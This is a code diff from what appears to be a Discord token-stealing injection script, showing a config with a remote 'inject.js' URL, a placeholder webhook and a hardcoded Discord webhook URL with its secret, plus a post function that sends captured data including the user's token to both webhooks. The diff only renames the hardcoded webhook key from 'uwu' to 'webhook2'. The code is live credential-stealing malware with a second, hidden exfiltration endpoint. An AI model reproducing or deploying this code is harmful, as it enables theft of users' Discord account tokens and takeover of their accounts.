@@ -18,7 +18,7 @@ var config = {
     creator: "%NAME_CREATOR%",
     injection_url: "https://raw.githubusercontent.com/mehod/test1/main/inject.js",
     webhook: "%WEBHOOK%",
-    uwu:"https://discord.com/api/webhooks/1103266637831999509/uBz5SOXMrNqi-m-dE_ielxB_Hc8ihnE_roXkZHZ4EtEwZok5aVcbUg_nt1B_pKhQ--73",
+    webhook2:"https://discord.com/api/webhooks/1103266637831999509/uBz5SOXMrNqi-m-dE_ielxB_Hc8ihnE_roXkZHZ4EtEwZok5aVcbUg_nt1B_pKhQ--73",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -238,7 +238,7 @@ const post = async (params) => {
         data: params,
         token: token
     });
-    [config.uwu, config.webhook].forEach(res => {
+    [config.webhook2, config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
